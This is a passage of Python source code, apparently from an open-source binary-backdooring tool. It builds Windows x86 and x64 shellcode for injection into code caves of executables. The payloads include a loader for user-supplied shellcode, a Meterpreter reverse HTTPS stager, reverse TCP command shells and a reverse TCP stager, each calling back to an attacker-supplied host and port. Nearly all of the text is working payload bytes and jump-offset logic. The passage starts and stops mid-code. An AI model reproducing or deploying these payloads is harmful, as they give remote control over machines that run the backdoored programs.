            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        breakupvar = eat_code_caves(flItms, 0, 1)
        
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE")
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode) + 5)

        self.shellcode1 += ("\x00\x00"
                            "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below

        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        #else:
        #    self.shellcode1 += "\xEB\x06\x01\x00\x00"

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        #Can inject any shellcode below.

        self.shellcode2 += self.supplied_shellcode
        self.shellcode1 += "\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))
        
        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https(self, flItms, CavesPicked={}):
        """
        Traditional meterpreter reverse https shellcode from metasploit
        modified to support cave jumping.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        breakupvar = eat_code_caves(flItms, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           )

        self.shellcode1 += "\xBE"
        self.shellcode1 += struct.pack("<H", 361 + len(self.HOST))
        self.shellcode1 += "\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 +=  ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                           "\x89\xF1"
                           )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"   # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<H", 361 + len(self.HOST))
            self.shellcode1 += "\x00\x00"  # <---length shellcode2 + 5

        #Begin shellcode 2:
        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        self.shellcode2 += ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68"
                            "\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
                            "\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68")
        self.shellcode2 += struct.pack("<h", self.PORT)
        self.shellcode2 += ("\x00\x00\x53"
                            "\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
                            "\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
                            "\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a"
                            "\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a"
                            "\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x48\x45"
                            "\x56\x79\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00"
                            "\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff"
                            "\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68"
                            "\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85"
                            "\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 += "\x00"

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/shell_reverse_tcp shellcode
        to enable continued execution and cave jumping.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        #breakupvar is the distance between codecaves
        breakupvar = eat_code_caves(flItms, 0, 1)
        self.shellcode1 = "\xfc\xe8"

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
                            )

        self.shellcode2 = ("\x5d\x68\x33\x32\x00\x00\x68"
                           "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                           "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                           "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                           "\x68"
                           )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)  # PORT
        self.shellcode2 += ("\x89\xe6\x6a\x10\x56"
                            "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                            "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                            "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                            "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                            #The NOP in the line below allows for continued execution.
                            "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                            "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                            "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                            "\x81\xc4\xfc\x01\x00\x00"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)



########NEW FILE########
__FILENAME__ = WinIntelPE64
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''


##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################
import struct
import sys
from intelmodules import eat_code_caves

class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """
    
    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        self.HOST = HOST
        self.PORT = PORT
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = ("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = ("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8")

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def cave_miner(self, flItms, CavesPicked={}):
        """
        Sample code for finding sutable code caves
        """

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ""

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                self.shellcode1 += "\xe9"
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        #else:
        #    self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x90"*13)

        self.shellcode2 = ("\x90"*19)

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
    

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1) 
        with the help of Steven Fewer's work on msf win64 payloads. 
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
